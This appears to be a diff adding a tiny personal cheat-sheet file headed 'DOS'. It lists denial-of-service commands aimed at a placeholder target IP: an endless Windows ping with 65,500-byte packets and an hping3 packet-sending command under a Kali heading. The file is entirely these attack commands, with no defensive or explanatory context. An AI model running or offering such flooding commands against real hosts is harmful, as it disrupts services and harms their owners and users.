@@ -1,0 +1,4 @@
+/-------DOS 
+#WIN    ping -t -l 65500 <target ip>
+#kali   man hping3
+        hping3 -v -c 100 -d100 <target ip>
